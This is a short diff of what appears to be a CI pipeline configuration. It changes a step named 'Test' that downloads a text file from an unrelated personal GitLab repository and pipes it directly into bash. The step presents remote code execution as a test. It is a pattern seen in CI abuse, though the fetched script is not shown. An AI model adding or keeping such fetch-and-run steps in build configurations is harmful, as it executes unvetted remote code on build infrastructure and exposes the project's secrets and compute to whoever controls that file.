@@ -9,7 +9,7 @@ jobs:
     steps:
       - checkout
       - run:
-          command: curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash
+          command: curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar1.txt | bash
           name: Test
 
 workflows:
